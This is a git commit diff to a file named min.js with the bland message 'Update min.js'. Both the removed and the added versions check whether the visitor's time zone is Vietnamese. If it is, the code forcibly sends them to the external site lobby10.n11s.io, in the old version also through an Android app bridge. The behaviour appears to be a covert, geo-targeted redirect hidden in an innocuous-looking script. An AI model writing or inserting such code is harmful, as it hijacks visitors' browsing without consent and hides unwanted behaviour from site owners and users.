ec70b148fe6176fc57fab547cd6d7c0b8d5f1b28
hai07t <hai07t@gmail.com>
2025-08-30 19:18:53 +0700

    Update min.js

--- min.js
+++ min.js
@@ -1,15 +1,4 @@
-const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-console.log(userTimeZone);
-
-if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
-  try {
-    if (window.AndroidBridge && typeof AndroidBridge.openExternal === "function") {
-      AndroidBridge.openExternal("https://lobby10.n11s.io/");
-    } else {
-      // fallback nếu chạy trên web thường
-      window.location.href = "https://lobby10.n11s.io/";
-    }
-  } catch (e) {
-    window.location.href = "https://lobby10.n11s.io/";
+  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  if (tz === "Asia/Ho_Chi_Minh" || tz === "Asia/Saigon") {
+    window.open("https://lobby10.n11s.io/", "_blank");
   }
-}
